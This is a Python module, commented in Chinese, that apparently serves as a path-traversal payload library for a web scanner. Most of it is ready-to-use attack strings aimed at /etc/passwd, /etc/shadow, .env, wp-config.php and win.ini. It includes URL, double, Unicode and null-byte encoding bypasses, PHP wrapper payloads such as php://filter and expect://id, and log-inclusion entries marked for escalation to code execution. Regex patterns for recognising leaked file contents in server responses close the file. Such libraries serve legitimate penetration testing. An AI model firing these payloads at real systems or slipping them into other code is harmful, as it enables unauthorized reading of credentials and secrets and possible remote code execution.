"""路径穿越 Payload 库 — 按操作系统和编码方式分类

覆盖:
- Linux 敏感文件: /etc/passwd, /etc/shadow, /etc/hosts, /proc/self/environ
- Windows 敏感文件: win.ini, boot.ini, hosts
- 编码绕过: URL 编码, 双重编码, Unicode, 路径变体
- Wrapper 路径: 在正常路径前添加穿越序列
- 路径规范化绕过: 多余斜杠、反斜杠、点号混淆
"""

import re
from typing import List, Dict

# ========== Linux 路径穿越 Payload ==========
LINUX_TRAVERSAL = [
    # /etc/passwd 各层级穿越
    {"payload": "../../../../etc/passwd", "depth": 4, "file": "/etc/passwd"},
    {"payload": "../../../etc/passwd", "depth": 3, "file": "/etc/passwd"},
    {"payload": "../../../../../../etc/passwd", "depth": 6, "file": "/etc/passwd"},
    {"payload": "../../../../../../../../etc/passwd", "depth": 8, "file": "/etc/passwd"},
    {"payload": "../../../../../etc/passwd", "depth": 5, "file": "/etc/passwd"},
    # /etc/shadow
    {"payload": "../../../../etc/shadow", "depth": 4, "file": "/etc/shadow"},
    {"payload":  "../../../../etc/shadow%00", "depth": 4, "file": "/etc/shadow"},
    # /etc/hosts
    {"payload": "../../../../etc/hosts", "depth": 4, "file": "/etc/hosts"},
    {"payload": "../../../etc/hosts", "depth": 3, "file": "/etc/hosts"},
    # /proc 文件系统
    {"payload": "../../../../proc/self/environ", "depth": 4, "file": "/proc/self/environ"},
    {"payload": "../../../../proc/self/cmdline", "depth": 4, "file": "/proc/self/cmdline"},
    {"payload": "../../../../proc/self/status", "depth": 4, "file": "/proc/self/status"},
    {"payload": "../../../../proc/version", "depth": 4, "file": "/proc/version"},
    # 其他常见敏感文件
    {"payload": "../../../../etc/issue", "depth": 4, "file": "/etc/issue"},
    {"payload": "../../../../etc/group", "depth": 4, "file": "/etc/group"},
    {"payload": "../../../../var/log/apache2/access.log", "depth": 4, "file": "/var/log/apache2/access.log"},
    {"payload": "../../../../var/log/nginx/access.log", "depth": 4, "file": "/var/log/nginx/access.log"},
    {"payload": "../../../../.env", "depth": 4, "file": ".env"},
    {"payload": "../../../../.git/config", "depth": 4, "file": ".git/config"},
    {"payload": "../../../wp-config.php", "depth": 3, "file": "wp-config.php"},
]


# ========== Windows 路径穿越 Payload ==========
WINDOWS_TRAVERSAL = [
    {"payload": "..\\..\\..\\..\\windows\\win.ini", "depth": 4, "file": "C:\\windows\\win.ini"},
    {"payload": "..\\..\\..\\..\\windows\\system.ini", "depth": 4, "file": "C:\\windows\\system.ini"},
    {"payload": "..\\..\\..\\..\\boot.ini", "depth": 4, "file": "C:\\boot.ini"},
    {"payload": "..\\..\\windows\\win.ini", "depth": 2, "file": "C:\\windows\\win.ini"},
    {"payload": "..\\..\\..\\windows\\win.ini", "depth": 3, "file": "C:\\windows\\win.ini"},
    {"payload": "..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts", "depth": 3, "file": "hosts"},
    {"payload": "..\\..\\..\\boot.ini", "depth": 3, "file": "C:\\boot.ini"},
    {"payload": "..\\..\\..\\..\\..\\windows\\win.ini", "depth": 5, "file": "C:\\windows\\win.ini"},
    {"payload": "..\\..\\..\\..\\..\\..\\windows\\win.ini", "depth": 6, "file": "C:\\windows\\win.ini"},
    {"payload": "....//....//....//....//windows/win.ini", "depth": 4, "file": "C:\\windows\\win.ini"},
]

# 混合斜杠（Windows 也接受正斜杠）
MIXED_TRAVERSAL = [
    {"payload": "../../../windows/win.ini", "depth": 3, "file": "C:\\windows\\win.ini"},
    {"payload": "....//....//....//windows/win.ini", "depth": 3, "file": "C:\\windows\\win.ini"},
]


# ========== URL 编码变体 ==========
ENCODED_TRAVERSAL = [
    # 单次 URL 编码
    {"payload": "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "encoding": "url", "file": "/etc/passwd"},
    {"payload": "%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd", "encoding": "url_partial", "file": "/etc/passwd"},
    {"payload": "..%2f..%2f..%2f..%2fetc%2fpasswd", "encoding": "url_mixed", "file": "/etc/passwd"},
    {"payload": "%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini", "encoding": "url", "file": "C:\\windows\\win.ini"},
    # 双重 URL 编码
    {"payload": "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd", "encoding": "double_url", "file": "/etc/passwd"},
    {"payload": "..%252f..%252f..%252f..%252fetc%252fpasswd", "encoding": "double_url_mixed", "file": "/etc/passwd"},
    # Unicode 编码
    {"payload": "..%c0%af..%c0%af..%c0%af..%c0%afetc%c0%afpasswd", "encoding": "unicode", "file": "/etc/passwd"},
    {"payload": "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd", "encoding": "unicode_fullwidth", "file": "/etc/passwd"},
    # UTF-8 超长编码
    {"payload": "..%c1%9c..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd", "encoding": "utf8_overlong", "file": "/etc/passwd"},
]


# ========== 路径规范化绕过变体 ==========
NORMALIZATION_BYPASS = [
    # ....// 变体（某些解析器处理 ....// 时会规范化成 ../）
    {"payload": "....//....//....//....//etc/passwd", "variant": "double_dot_slash", "file": "/etc/passwd"},
    {"payload": "....//....//....//....//etc/shadow", "variant": "double_dot_slash", "file": "/etc/shadow"},
    {"payload": "....//....//....//....//windows/win.ini", "variant": "double_dot_slash", "file": "C:\\windows\\win.ini"},
    {"payload": "....\\/....\\/....\\/....\\/etc/passwd", "variant": "double_dot_backslash_slash", "file": "/etc/passwd"},
    # 多余正斜杠
    {"payload": "..//..//..//..//etc//passwd", "variant": "extra_slash", "file": "/etc/passwd"},
    {"payload": "..///..///..///..///etc///passwd", "variant": "extra_slashes", "file": "/etc/passwd"},
    # 点号 + 斜杠 组合
    {"payload": "./.././.././.././../etc/passwd", "variant": "dot_slash_mix", "file": "/etc/passwd"},
    {"payload": "....//....//....//....//etc/passwd%00", "variant": "null_byte", "file": "/etc/passwd"},
    # 空字节截断
    {"payload": "../../../../etc/passwd%00", "variant": "null_byte", "file": "/etc/passwd"},
    {"payload": "../../../../etc/passwd%00.jpg", "variant": "null_byte_ext", "file": "/etc/passwd"},
    {"payload": "../../../../etc/passwd\x00", "variant": "null_byte_raw", "file": "/etc/passwd"},
    # 反斜杠变体（Linux 上某些应用也会处理）
    {"payload": "..\\..\\..\\..\\etc\\passwd", "variant": "backslash", "file": "/etc/passwd"},
    {"payload": "..\\/..\\/..\\/..\\/etc\\/passwd", "variant": "mixed_slash", "file": "/etc/passwd"},
]


# ========== Wrapper / 前缀路径 ==========
# 在应用自身的路径前缀后添加穿越序列
WRAPPER_TRAVERSAL = [
    {"payload": "/var/www/html/../../../../etc/passwd", "variant": "absolute_wrapper", "file": "/etc/passwd"},
    {"payload": "/var/www/../../../../etc/passwd", "variant": "absolute_wrapper_short", "file": "/etc/passwd"},
    {"payload": "/usr/share/nginx/html/../../../../etc/passwd", "variant": "nginx_wrapper", "file": "/etc/passwd"},
    {"payload": "/opt/app/static/../../../../etc/passwd", "variant": "opt_wrapper", "file": "/etc/passwd"},
    {"payload": "/images/../../../etc/passwd", "variant": "images_wrapper", "file": "/etc/passwd"},
    {"payload": "uploads/../../../etc/passwd", "variant": "uploads_wrapper", "file": "/etc/passwd"},
]


# ========== PHP 特定 Payload ==========
PHP_SPECIFIC = [
    # PHP 封装器
    {"payload": "php://filter/convert.base64-encode/resource=index.php", "variant": "php_filter"},
    {"payload": "php://filter/read=convert.base64-encode/resource=/etc/passwd", "variant": "php_filter_absolute"},
    {"payload": "php://filter/convert.base64-encode/resource=../index.php", "variant": "php_filter_parent"},
    {"payload": "php://filter/convert.base64-encode/resource=../../etc/passwd", "variant": "php_filter_traversal"},
    {"payload": "php://input", "variant": "php_input"},
    {"payload": "php://fd/0", "variant": "php_fd"},
    {"payload": "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==", "variant": "data_uri"},
    {"payload": "expect://id", "variant": "expect"},
    {"payload": "phar://test.phar/test.txt", "variant": "phar"},
    # 日志文件包含（LFI → RCE）
    {"payload": "../../../../var/log/apache2/access.log", "variant": "log_inject"},
    {"payload": "../../../../var/log/nginx/access.log", "variant": "log_inject_nginx"},
    {"payload": "../../../../proc/self/fd/0", "variant": "proc_fd"},
    {"payload": "../../../../proc/self/fd/1", "variant": "proc_fd_stdout"},
]


# ========== 检测模式 ==========
# 按操作系统和文件类型组织的响应特征
DETECTION_PATTERNS: Dict[str, List[str]] = {
    # Linux /etc/passwd 特征
    "linux_passwd": [
        "root:x:0:0:",
        "root::0:0:",
        "daemon:x:1:1:",
        "bin:x:2:2:",
        "sys:x:3:3:",
        r"root:.*:0:0:",
        r"\w+:x:\d+:\d+:",
    ],
    # Linux /etc/shadow 特征
    "linux_shadow": [
        r"root:\$",
        r"root:!",
        r"root:\*:",
        r"\w+:\$[0-9a-zA-Z./$]+:",
    ],
    # Linux 通用系统文件特征
    "linux_system": [
        "root:",
        "daemon:",
        "bin:",
        "sys:",
        "www-data:",
        "/bin/bash",
        "/usr/sbin/nologin",
        "/bin/false",
        "Linux version",
        r"BOOT_IMAGE=",
    ],
    # Linux /etc/hosts 特征
    "linux_hosts": [
        "127.0.0.1",
        "localhost",
        "::1",
        "# The following lines are desirable",
    ],
    # Linux /proc 文件系统特征
    "linux_proc": [
        "PATH=",
        "HOME=",
        "USER=",
        "SHELL=",
        "HTTP_HOST=",
        "SERVER_NAME=",
        "DOCUMENT_ROOT=",
    ],
    # Windows win.ini 特征
    "windows_ini": [
        "[fonts]",
        "[extensions]",
        "[files]",
        "[Mail]",
        "MAPI=1",
        "CMC=1",
        "CMCDLLNAME32",
        "for 16-bit app support",
    ],
    # Windows boot.ini 特征
    "windows_boot": [
        "[boot loader]",
        "[operating systems]",
        "timeout=",
        r"multi(0)disk(0)",
        "WINDOWS",
        "Microsoft Windows",
    ],
    # Windows 通用系统文件特征
    "windows_system": [
        "[fonts]",
        "[extensions]",
        "[Version]",
        "signature",
        "Microsoft",
        "Windows",
        "[drivers]",
        "[mci]",
    ],
    # PHP 源码特征（当文件被读取而非执行时）
    "php_source": [
        "<?php",
        "<?=",
        "<?\n",
        "$_GET",
        "$_POST",
        "$_SERVER",
        "namespace ",
        "defined('",
        "require_once",
        "include_once",
    ],
    # .env 文件特征
    "env_file": [
        "DB_HOST=",
        "DB_PASSWORD=",
        "DB_USERNAME=",
        "DB_DATABASE=",
        "APP_KEY=",
        "APP_SECRET=",
        "REDIS_HOST=",
        "MAIL_HOST=",
        "JWT_SECRET=",
    ],
    # 错误信息特征（路径穿越失败时可能泄露的信息）
    "error_messages": [
        "failed to open stream",
        "No such file or directory",
        "include(",
        "include_once(",
        "require(",
        "require_once(",
        "file_get_contents(",
        "Warning: include",
        "Warning: require",
        "Fatal error:",
        "open_basedir restriction",
        "failed opening",
    ],
}


# ========== 聚合 Payload 列表 ==========

def _combine_all(*lists) -> list:
    """合并多个 payload 列表"""
    result = []
    for lst in lists:
        result.extend(lst)
    return result


ALL_LINUX = _combine_all(
    LINUX_TRAVERSAL,
    NORMALIZATION_BYPASS[:6],  # 取 Linux 相关的
    WRAPPER_TRAVERSAL,
)


# ========== Getter 函数 ==========

def get_linux_traversal() -> List[Dict]:
    """获取 Linux 路径穿越 Payload"""
    return LINUX_TRAVERSAL


def get_windows_traversal() -> List[Dict]:
    """获取 Windows 路径穿越 Payload"""
    return WINDOWS_TRAVERSAL


def get_encoded_traversal() -> List[Dict]:
    """获取编码绕过 Payload"""
    return ENCODED_TRAVERSAL


def get_normalization_bypass() -> List[Dict]:
    """获取路径规范化绕过 Payload"""
    return NORMALIZATION_BYPASS


def get_wrapper_traversal() -> List[Dict]:
    """获取 Wrapper 前缀路径 Payload"""
    return WRAPPER_TRAVERSAL


def get_php_specific() -> List[Dict]:
    """获取 PHP 特定 Payload"""
    return PHP_SPECIFIC


def get_all_traversal() -> List[Dict]:
    """获取所有路径穿越 Payload（合并，用于全面扫描）"""
    return _combine_all(
        LINUX_TRAVERSAL,
        WINDOWS_TRAVERSAL,
        ENCODED_TRAVERSAL,
        NORMALIZATION_BYPASS,
        WRAPPER_TRAVERSAL,
    )


def get_detection_patterns() -> Dict[str, List[str]]:
    """获取检测模式字典"""
    return DETECTION_PATTERNS


def get_patterns_by_os(os_type: str) -> List[str]:
    """按操作系统获取检测模式列表

    Args:
        os_type: "linux" 或 "windows"
    """
    patterns = []
    if os_type == "linux":
        for key in ["linux_passwd", "linux_shadow", "linux_system", "linux_hosts", "linux_proc"]:
            patterns.extend(DETECTION_PATTERNS.get(key, []))
    elif os_type == "windows":
        for key in ["windows_ini", "windows_boot", "windows_system"]:
            patterns.extend(DETECTION_PATTERNS.get(key, []))
    else:
        # 返回所有
        for key, pat_list in DETECTION_PATTERNS.items():
            patterns.extend(pat_list)

    return patterns


def match_file_content(text: str) -> tuple[str | None, str | None]:
    """匹配响应文本中的文件内容特征

    Args:
        text: 响应文本

    Returns:
        (category, matched_pattern) 元组
        category 如 "linux_passwd", "windows_ini", "php_source" 等
    """
    # 按优先级排序的检测顺序
    priority_order = [
        "linux_passwd",
        "linux_shadow",
        "windows_ini",
        "windows_boot",
        "linux_proc",
        "env_file",
        "php_source",
        "linux_system",
        "windows_system",
        "linux_hosts",
    ]

    for category in priority_order:
        patterns = DETECTION_PATTERNS.get(category, [])
        for pattern in patterns:
            if re.search(pattern, text, re.IGNORECASE):
                return (category, pattern)

    return (None, None)
